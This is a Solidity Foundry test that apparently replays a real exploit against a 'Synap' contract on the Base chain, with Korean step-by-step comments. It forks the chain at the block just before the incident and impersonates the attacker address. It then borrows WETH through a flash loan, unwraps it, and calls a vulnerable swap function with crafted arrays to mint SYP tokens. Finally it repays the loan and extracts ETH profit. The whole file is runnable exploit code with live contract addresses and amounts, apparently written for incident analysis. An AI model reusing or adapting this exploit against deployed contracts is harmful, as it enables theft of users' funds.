// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

interface IFlashWalletSynap {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IWETHSynap is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface ISynapTarget {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address[] calldata recipients,
        uint256[] calldata rates,
        bool[] calldata flags
    ) external payable;
}

/// @notice 실제 공격 흐름을 단계별로 재현하는 테스트 컨트랙트
contract SynapLogicStepByStepPoC is BaseTest {
    address internal constant ATTACKER_EOA = 0x3Aa8bb3A19EECD229Cb33fbc03Ff549473e30F38;
    address internal constant TARGET = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32;
    address internal constant FLASH_WALLET = 0xd0b53D9277642d899DF5C87A3966A349A798F224;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant SYP = 0x2BdD3602Fc526AA5CC677Cd708375dD2F7C4256F;

    uint256 internal constant BORROW_AMOUNT = 13_830_195_892_125_000_001;
    uint256 internal constant ATTACK_CALL_VALUE = 13_823_284_250_000_000_000;
    uint256 internal constant ARRAY_LEN = 30;

    receive() external payable {}

    function setUp() public {
        // 사건 직전 블록으로 포크한다.
        vm.createSelectFork("base", 41038633);
        target = TARGET;
    }

    function testStepByStepPoC() public balanceLog {
        // 트랜잭션 컨텍스트를 고정한다.
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);

        uint256 flashWalletWethBefore = IERC20(WETH).balanceOf(FLASH_WALLET);
        SynapLogicAttacker attacker = new SynapLogicAttacker(TARGET, FLASH_WALLET, WETH);

        // 1) flash loan 진입 2) callback 악용 3) 상환 4) 최종 인출
        attacker.attack(BORROW_AMOUNT, ATTACK_CALL_VALUE, ARRAY_LEN);
        attacker.withdrawTo(payable(address(this)));

        vm.stopPrank();

        uint256 flashWalletWethAfter = IERC20(WETH).balanceOf(FLASH_WALLET);

        // --- 검증 포인트 ---
        // (A) 최종 수익
        assertGt(address(this).balance, 0, "no ETH profit captured");
        // (B) callback 전후 WETH 변화
        assertEq(attacker.lastWethBeforeWithdraw(), BORROW_AMOUNT, "unexpected callback WETH before unwrap");
        assertEq(attacker.lastWethAfterWithdraw(), 0, "WETH should be fully unwrapped");
        // (C) SYP 민팅 발생
        assertGt(attacker.lastSypAfter(), attacker.lastSypBefore(), "SYP mint did not happen");
        // (D) flash fee 정상 상환
        assertEq(flashWalletWethAfter - flashWalletWethBefore, attacker.lastFee0(), "flash fee repayment mismatch");
    }
}

/// @notice flash callback 내부에서 취약 함수 호출
contract SynapLogicAttacker {
    address public immutable target;
    address public immutable flashWallet;
    IWETHSynap public immutable weth;
    IERC20 public immutable syp;

    uint256 private borrowAmount;
    uint256 public lastFee0;
    uint256 public lastWethBeforeWithdraw;
    uint256 public lastWethAfterWithdraw;
    uint256 public lastSypBefore;
    uint256 public lastSypAfter;

    receive() external payable {}

    constructor(address _target, address _flashWallet, address _weth) {
        target = _target;
        flashWallet = _flashWallet;
        weth = IWETHSynap(_weth);
        syp = IERC20(0x2BdD3602Fc526AA5CC677Cd708375dD2F7C4256F);
    }

    function attack(uint256 _borrowAmount, uint256 attackCallValue, uint256 length) external {
        borrowAmount = _borrowAmount;
        // Step 1) flash 대출로 초기 자본 확보
        IFlashWalletSynap(flashWallet).flash(address(this), _borrowAmount, 0, abi.encode(attackCallValue, length));
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        require(msg.sender == flashWallet, "only flash wallet");

        (uint256 attackCallValue, uint256 length) = abi.decode(data, (uint256, uint256));
        lastFee0 = fee0;

        // Step 2) 취약 함수는 msg.value를 사용하므로 WETH를 ETH로 언랩
        lastWethBeforeWithdraw = weth.balanceOf(address(this));
        weth.withdraw(lastWethBeforeWithdraw);
        lastWethAfterWithdraw = weth.balanceOf(address(this));

        // Step 3) whitelist/분배 로직을 자극하는 긴 배열 구성
        (address[] memory recipients, uint256[] memory rates, bool[] memory flags) = _buildExploitArrays(length);

        // Step 4) 취약 함수 호출(0x670a3267) + SYP 민팅 전후 잔고 기록
        lastSypBefore = syp.balanceOf(address(this));
        ISynapTarget(target).swapExactTokensForETHSupportingFeeOnTransferTokens{value: attackCallValue}(
            recipients, rates, flags
        );
        lastSypAfter = syp.balanceOf(address(this));

        // Step 5) flash 원금 + fee 상환
        uint256 repayAmount = borrowAmount + fee0;
        weth.deposit{value: repayAmount}();
        require(weth.transfer(flashWallet, repayAmount), "repay transfer failed");
    }

    function withdrawTo(address payable to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "withdraw failed");
    }

    function _buildExploitArrays(
        uint256 length
    ) internal view returns (address[] memory recipients, uint256[] memory rates, bool[] memory flags) {
        recipients = new address[](length);
        rates = new uint256[](length);
        flags = new bool[](length);

        for (uint256 i; i < length; i++) {
            recipients[i] = address(this);
            rates[i] = 10;
            flags[i] = true;
        }
    }
}
